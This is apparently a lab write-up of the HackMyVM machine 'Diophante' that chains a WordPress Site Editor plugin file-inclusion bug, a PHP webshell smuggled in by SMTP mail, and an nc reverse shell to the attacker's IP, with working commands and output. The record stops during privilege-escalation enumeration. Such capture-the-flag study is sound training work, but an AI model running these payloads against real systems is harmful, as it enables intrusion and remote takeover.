---
title: Diophante
author: hgbe02
date: 2025-06-14 11:15:26 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Diophante.html"
---

# Diophante

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116105.png" alt="image-20250613212916590" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116107.png" alt="image-20250614091814914" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ rustscan -a $IP -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.107:22
Open 192.168.10.107:25
Open 192.168.10.107:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   2048 34:55:b2:c3:59:4e:b1:e5:dc:47:bb:73:f6:df:de:43 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC31MDow8cn4PkHzTyr6hHNjHWNqArCM26Eel8Tl1DxnZX56uuHi893mc/+VVo75DqHnfU6etdZhCPeZ+5O3AS6iinLDT7vSlPd013+SHDU3gFHtvz76fLejnlnen4N7Vf37jYcfdF1EG9C7k017gDQc9Cby4/QwGpXyrYAcLxmhO0odPDBQyULO/gzzTkfyCJROF/+vrr2AcX/K4i9Sa9sE31FzDo1N/bh0GOhlika1gB8KbBtcBDqWr0UpZIcbnQZZWQRCI9JpxRNhO3azk9kkh7gyJ/Ul3rniU/BgX1oQhJqVDACuMDlHDTud43MStiuOnC3OaTQqkrGAVAfwBOl
|   256 5a:c3:b8:80:53:27:8f:b4:ef:27:89:c8:e5:a6:1f:81 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCok8Zb2Hn7EFxIGAbamuVBZEtn/ZdRpDwrIRWK8pWua+Mcn69g9Ddrd7CC87isXqcfV2St0XtBstpKi+Pg9LvY=
|   256 08:46:e6:ba:d3:64:31:88:e7:d3:66:94:ce:52:80:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG1XyCckVuVysYcnoiHoHkcDpY1TOfwJ3V+Gh9yGbUXR
25/tcp open  smtp    syn-ack ttl 64 Postfix smtpd
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-07T07:11:28
| Not valid after:  2031-04-05T07:11:28
| MD5:   57e2:69bb:8411:97da:6ae7:23ec:682c:e1d7
| SHA-1: e8cd:3c39:4301:4e53:99b6:ba02:3fea:04bd:a48b:0f66
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUWq6t5x5ifQADHbAT1jP8zFP1HDAwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIxMDQwNzA3MTEyOFoXDTMxMDQwNTA3
| MTEyOFowETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEArs5OM6mhTflVnLKiwC08GRsXSQidMlmFDJGECVtfwhdWJZlAaYju
| u8g25w+1shV5jxa47PnSsfp7Jr2urVsPl1iAiqqrSC84nbrzhP5LpPD4wzFuOGak
| 0U77Yb9mv1fX1AZNoEm4S5GTFvOMb2cfIbVbUFgX3vREMOAQUTyjX4+Bxns4/1M/
| 9sZweDdAUrgHscJu8o2v2tRTeW6wSQAbiRer0C9oExqOQHYaZzbaFwnEPyzCHdgO
| 6zzIhGeX8xNcjE3YdjbW3+eVvE8QOEfScQoc0K1HFpUXtY2OsLGrUTkiGcFqV6zA
| tVhP74FDfPyNue/1bIhkogK7PbJT3ONgQwIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAMdm+7kAojV0ZLAGD
| +a+tWQ8OiauOFfjUK9IGljJbKc0xujYWq6glJJHI4h2QF6CjxOBL5mPV5qt4JYvZ
| yFWJvzWvjy0pDwgsm8OHL8sJydZrqBw1QjLWYnPHhpeKbiZO9W9mYkTC7r8aNreW
| z7yF/l7diFs8csEFvKnG9C3JtRgFo0C1baWn5GraecBut9E6QCdz0Ad/Gqu30cEY
| 6ArLC+jHkX4phDH0V5/FJov0kctTdIlu0Oj+ItfvOel5ifn3tLIBEVmutvuHim6x
| vrkdNkjdLmjgdKjm8y+vWHDDKn+Z/sEHp8AXqJj7ynf3mE6RrQgTJLFG4R0R84n7
| 9bqenw==
|_-----END CERTIFICATE-----
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD OPTIONS
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:7B:4E:08 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host:  debian; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html txt php -s 200 301 302 -d 22>/dev/null

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.10.107/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 22
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
^C                                                                                                                                                                                             
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html txt php -s 200 301 302 -d 2 2>/dev/null
                                                                                                                                                                                             
301      GET        9l       28w      315c http://192.168.10.107/blog => http://192.168.10.107/blog/
200      GET      368l      933w    10701c http://192.168.10.107/index.html
200      GET       24l      126w    10356c http://192.168.10.107/icons/openlogo-75.png
200      GET      368l      933w    10701c http://192.168.10.107/
301      GET        9l       28w      326c http://192.168.10.107/blog/wp-content => http://192.168.10.107/blog/wp-content/
200      GET      104l      522w     8227c http://192.168.10.107/blog/wp-login.php
200      GET      384l     3177w    19915c http://192.168.10.107/blog/license.txt
301      GET        9l       28w      327c http://192.168.10.107/blog/wp-includes => http://192.168.10.107/blog/wp-includes/
301      GET        0l        0w        0c http://192.168.10.107/blog/index.php => http://192.168.10.107/blog/
200      GET      379l      746w     5972c http://192.168.10.107/blog/wp-admin/css/install.css
200      GET       13l       78w     4373c http://192.168.10.107/blog/wp-admin/images/wordpress-logo.png
302      GET        0l        0w        0c http://192.168.10.107/blog/wp-admin/update-core.php => http://hard/blog/wp-login.php?redirect_to=http%3A%2F%2F192.168.10.107%2Fblog%2Fwp-admin%2Fupdate-core.php&reauth=1
302      GET        0l        0w        0c http://192.168.10.107/blog/wp-admin/import.php => http://hard/blog/wp-login.php?redirect_to=http%3A%2F%2F192.168.10.107%2Fblog%2Fwp-admin%2Fimport.php&reauth=1
200      GET       17l       88w     1287c http://192.168.10.107/blog/wp-admin/install.php
200      GET       23l       86w     1248c http://192.168.10.107/blog/wp-admin/upgrade.php
302      GET        0l        0w        0c http://192.168.10.107/blog/wp-admin/ => http://hard/blog/wp-login.php?redirect_to=http%3A%2F%2F192.168.10.107%2Fblog%2Fwp-admin%2F&reauth=1
200      GET       99l     1009w     8852c http://192.168.10.107/blog/readme.html
200      GET        3l        6w       36c http://192.168.10.107/note.txt
200      GET        5l       15w      165c http://192.168.10.107/blog/wp-trackback.php
301      GET        9l       28w      324c http://192.168.10.107/blog/wp-admin => http://192.168.10.107/blog/wp-admin/
302      GET        0l        0w        0c http://192.168.10.107/blog/wp-signup.php => http://hard/blog/wp-login.php?action=register
```

### wpscan扫描

目录扫描粗略发现是一个`wordpress`

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ wpscan --url http://$IP/blog --api-token xxxxxxxxxxxxxxx
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.10.107/blog/ [192.168.10.107]
[+] Started: Fri Jun 13 21:31:19 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.10.107/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.10.107/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.10.107/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.10.107/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.10.107/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.10.107/blog/, Match: 'WordPress 5.7'
 |
 | [!] 44 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
 |     Fixed in: 5.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/29378
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh
 |      - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/
 |      - https://hackerone.com/reports/1095645
 |      - https://www.youtube.com/watch?v=3NBxcmqCgt4
 ---------------------
  | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 5.7.12
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 5.7.12
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==============================================================================================================> (137 / 137) 100.00% Time: 00:00:00
[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 24

[+] Finished: Fri Jun 13 21:31:29 2025
[+] Requests Done: 142
[+] Cached Requests: 29
[+] Data Sent: 37.18 KB
[+] Data Received: 46.259 KB
[+] Memory used: 237.539 MB
[+] Elapsed time: 00:00:09
```

然后检索了一下用户：

```bash
[i] User(s) Identified:

[+] sabine
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

## 漏洞发现

### 踩点

登录页面是一个默认的登录页面`Apache2 Debian Default Page`，看来东西不在这。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116108.png" alt="image-20250614093635581" style="zoom:50%;" />

### knock

目录发现一处提示：

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ curl -s http://192.168.10.107/note.txt
Don't forget: 7000 8000 9000

admin
```

knock 一下：

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ knock 7000 8000 9000

┌──(kali㉿kali)-[~/temp/Diophante]
└─$ rustscan -a $IP -- -sCV

Open 192.168.10.107:22
Open 192.168.10.107:25
Open 192.168.10.107:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   2048 34:55:b2:c3:59:4e:b1:e5:dc:47:bb:73:f6:df:de:43 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC31MDow8cn4PkHzTyr6hHNjHWNqArCM26Eel8Tl1DxnZX56uuHi893mc/+VVo75DqHnfU6etdZhCPeZ+5O3AS6iinLDT7vSlPd013+SHDU3gFHtvz76fLejnlnen4N7Vf37jYcfdF1EG9C7k017gDQc9Cby4/QwGpXyrYAcLxmhO0odPDBQyULO/gzzTkfyCJROF/+vrr2AcX/K4i9Sa9sE31FzDo1N/bh0GOhlika1gB8KbBtcBDqWr0UpZIcbnQZZWQRCI9JpxRNhO3azk9kkh7gyJ/Ul3rniU/BgX1oQhJqVDACuMDlHDTud43MStiuOnC3OaTQqkrGAVAfwBOl
|   256 5a:c3:b8:80:53:27:8f:b4:ef:27:89:c8:e5:a6:1f:81 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCok8Zb2Hn7EFxIGAbamuVBZEtn/ZdRpDwrIRWK8pWua+Mcn69g9Ddrd7CC87isXqcfV2St0XtBstpKi+Pg9LvY=
|   256 08:46:e6:ba:d3:64:31:88:e7:d3:66:94:ce:52:80:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG1XyCckVuVysYcnoiHoHkcDpY1TOfwJ3V+Gh9yGbUXR
25/tcp open  smtp    syn-ack ttl 64 Postfix smtpd
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-07T07:11:28
| Not valid after:  2031-04-05T07:11:28
| MD5:   57e2:69bb:8411:97da:6ae7:23ec:682c:e1d7
| SHA-1: e8cd:3c39:4301:4e53:99b6:ba02:3fea:04bd:a48b:0f66
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUWq6t5x5ifQADHbAT1jP8zFP1HDAwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIxMDQwNzA3MTEyOFoXDTMxMDQwNTA3
| MTEyOFowETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEArs5OM6mhTflVnLKiwC08GRsXSQidMlmFDJGECVtfwhdWJZlAaYju
| u8g25w+1shV5jxa47PnSsfp7Jr2urVsPl1iAiqqrSC84nbrzhP5LpPD4wzFuOGak
| 0U77Yb9mv1fX1AZNoEm4S5GTFvOMb2cfIbVbUFgX3vREMOAQUTyjX4+Bxns4/1M/
| 9sZweDdAUrgHscJu8o2v2tRTeW6wSQAbiRer0C9oExqOQHYaZzbaFwnEPyzCHdgO
| 6zzIhGeX8xNcjE3YdjbW3+eVvE8QOEfScQoc0K1HFpUXtY2OsLGrUTkiGcFqV6zA
| tVhP74FDfPyNue/1bIhkogK7PbJT3ONgQwIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAMdm+7kAojV0ZLAGD
| +a+tWQ8OiauOFfjUK9IGljJbKc0xujYWq6glJJHI4h2QF6CjxOBL5mPV5qt4JYvZ
| yFWJvzWvjy0pDwgsm8OHL8sJydZrqBw1QjLWYnPHhpeKbiZO9W9mYkTC7r8aNreW
| z7yF/l7diFs8csEFvKnG9C3JtRgFo0C1baWn5GraecBut9E6QCdz0Ad/Gqu30cEY
| 6ArLC+jHkX4phDH0V5/FJov0kctTdIlu0Oj+ItfvOel5ifn3tLIBEVmutvuHim6x
| vrkdNkjdLmjgdKjm8y+vWHDDKn+Z/sEHp8AXqJj7ynf3mE6RrQgTJLFG4R0R84n7
| 9bqenw==
|_-----END CERTIFICATE-----
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:7B:4E:08 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host:  debian; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`25`端口开放了！

### 插件漏洞=>LFI

检索一下是否存在漏洞，检索一下插件：

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ cmseek -u $IP/blog

___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  Deep Scan Results  [+] 

 ┏━Target: 192.168.10.107
 ┃
 ┠── CMS: WordPress
 ┃    │
 ┃    ├── Version: 5.7
 ┃    ╰── URL: https://wordpress.org
 ┃
 ┠──[WordPress Deepscan]
 ┃    │
 ┃    ├── License file: http://192.168.10.107/blog/license.txt
 ┃    │
 ┃    ├── Plugins Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Plugin: site-editor
 ┃    │        │
 ┃    │        ├── Version: 4.3
 ┃    │        ╰── URL: http://192.168.10.107/blog/wp-content/plugins/site-editor
 ┃    │
 ┃    │
 ┃    ├── Themes Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Theme: twentynineteen
 ┃    │        │
 ┃    │        ├── Version: 2.0
 ┃    │        ╰── URL: http://192.168.10.107/blog/wp-content/themes/twentynineteen
 ┃    │
 ┃
 ┠── Result: /home/kali/temp/Diophante/Result/192.168.10.107_blog/cms.json
 ┃
 ┗━Scan Completed in 1.71 Seconds, using 45 Requests



 CMSeeK says ~ Annyeong
```

发现一处插件，看一下有无相关漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116109.png" alt="image-20250614095547471" style="zoom:50%;" />

看一下如何利用的：

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ cat 44340.txt                                              
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-editor/
Vendor: Site Editor
Tested version: 1.1.1
CVE ID: CVE-2018-7422

** CVE description **
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

** Technical details **
In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php:5, the value of the ajax_path parameter is used for including a file with PHP’s require_once(). This parameter can be controlled by an attacker and is not properly sanitized.

Vulnerable code:
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
    require_once $_REQUEST['ajax_path'];
}

https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

** Solution **
No fix available yet.

** Timeline **
03/01/2018: author contacted through siteeditor.org's contact form; no reply
16/01/2018: issue report filled on the public GitHub page with no technical details
18/01/2018: author replies and said he replied to our e-mail 8 days ago (could not find the aforementioned e-mail at all); author sends us "another" e-mail
19/01/2018: report sent; author says he will fix this issue "very soon"
31/01/2018: vendor contacted to ask about an approximate release date and if he needs us to postpone the disclosure; no reply
14/02/2018: WP Plugins team contacted; no reply
06/03/2018: vendor contacted; no reply
07/03/2018: vendor contacted; no reply
15/03/2018: public disclosure

** Credits **
Vulnerability discovered by Nicolas Buzy-Debat working at Orange Cyberdefense Singapore (CERT-LEXSI).

--
Best Regards,

Nicolas Buzy-Debat
Orange Cyberdefense Singapore (CERT-LEXSI)
```

尝试利用：

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ curl "http://192.168.10.107/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd" --output -
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
sabine:x:1000:1000:sabine,,,:/home/sabine:/bin/rbash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:107:114::/var/spool/postfix:/usr/sbin/nologin
leonard:x:1001:1001:,,,:/home/leonard:/bin/bash
{"success":true,"data":{"output":[]}}
```

### 邮件上传webshell

由于已经有文件包含漏洞了，尝试上传一个`shell`就能`RCE`了，尝试使用 smtp 功能进行添加：

> 这里对机子拍个快照，免得失败了麻烦。。。
>
> <img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116110.png" alt="image-20250614100554057" style="zoom:50%;" />
>
> 如果没上面那工具栏，使用右边的 ctrl+f 或者 c 试试

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ telnet $IP 25
Trying 192.168.10.107...
Connected to 192.168.10.107.
Escape character is '^]'.
220 debian ESMTP Postfix (Debian/GNU)
helo abc
250 debian
MAIL FROM: kali@kali.com
250 2.1.0 Ok
RCPT TO: sabine
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?=`$_GET[0]`?>     
.
250 2.0.0 Ok: queued as 167E180ABD
quit
221 2.0.0 Bye
Connection closed by foreign host.
```

用户是最开始信息搜集时候`wpscan`扫到的，尝试访问进行执行命令！

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ curl "http://192.168.10.107/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&0=whoami" --output - 
From kali@kali.com  Sat Jun 14 04:11:43 2025
Return-Path: <kali@kali.com>
X-Original-To: sabine
Delivered-To: sabine@debian
Received: from abc (unknown [192.168.10.102])
        by debian (Postfix) with SMTP id 167E180ABD
        for <sabine>; Sat, 14 Jun 2025 04:10:22 +0200 (CEST)

www-data

{"success":true,"data":{"output":[]}}
```

执行成功，设置监听，尝试反弹shell！！！！

```bash
┌──(kali㉿kali)-[~/temp/Diophante]
└─$ curl "http://192.168.10.107/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&0=nc+-e+/bin/bash+192.168.10.102+1234" --output -
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116111.png" alt="image-20250614101633797" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@diophante:/var/www/html/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes$ cd ~
(remote) www-data@diophante:/var/www$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Apr  7  2021 .
drwxr-xr-x 12 root     root     4096 Apr  7  2021 ..
drwxr-xr-x  3 www-data www-data 4096 Apr 14  2021 html
(remote) www-data@diophante:/var/www$ cd html
(remote) www-data@diophante:/var/www/html$ ls -la
total 28
drwxr-xr-x 3 www-data www-data  4096 Apr 14  2021 .
drwxr-xr-x 3 root     root      4096 Apr  7  2021 ..
drwxr-xr-x 5 www-data www-data  4096 Apr 14  2021 blog
-rw-r--r-- 1 www-data www-data 10701 Apr  7  2021 index.html
-rw-r--r-- 1 www-data www-data    36 Apr 14  2021 note.txt
(remote) www-data@diophante:/var/www/html$ cd blog
(remote) www-data@diophante:/var/www/html/blog$ ls -la
total 228
drwxr-xr-x  5 www-data www-data  4096 Apr 14  2021 .
drwxr-xr-x  3 www-data www-data  4096 Apr 14  2021 ..
-rw-r--r--  1 www-data www-data   299 Apr  7  2021 .htaccess
-rw-r--r--  1 www-data www-data   405 Apr  7  2021 index.php
-rw-r--r--  1 www-data www-data 19915 Apr  7  2021 license.txt
-rw-r--r--  1 www-data www-data  8852 Apr  7  2021 readme.html
-rw-r--r--  1 www-data www-data  7165 Apr  7  2021 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Apr  7  2021 wp-admin
-rw-r--r--  1 www-data www-data   351 Apr  7  2021 wp-blog-header.php
-rw-r--r--  1 www-data www-data  2328 Apr  7  2021 wp-comments-post.php
-rw-r--r--  1 www-data www-data  3538 Apr  7  2021 wp-config-sample.php
-rw-rw-rw-  1 www-data www-data  3812 Apr  7  2021 wp-config.php
drwxr-xr-x  7 www-data www-data  4096 Jun 14 03:53 wp-content
-rw-r--r--  1 www-data www-data  3939 Apr  7  2021 wp-cron.php
drwxr-xr-x 25 www-data www-data 12288 Apr  7  2021 wp-includes
-rw-r--r--  1 www-data www-data  2496 Apr  7  2021 wp-links-opml.php
-rw-r--r--  1 www-data www-data  3313 Apr  7  2021 wp-load.php
-rw-r--r--  1 www-data www-data 44993 Apr  7  2021 wp-login.php
-rw-r--r--  1 www-data www-data  8509 Apr  7  2021 wp-mail.php
-rw-r--r--  1 www-data www-data 21125 Apr  7  2021 wp-settings.php
-rw-r--r--  1 www-data www-data 31328 Apr  7  2021 wp-signup.php
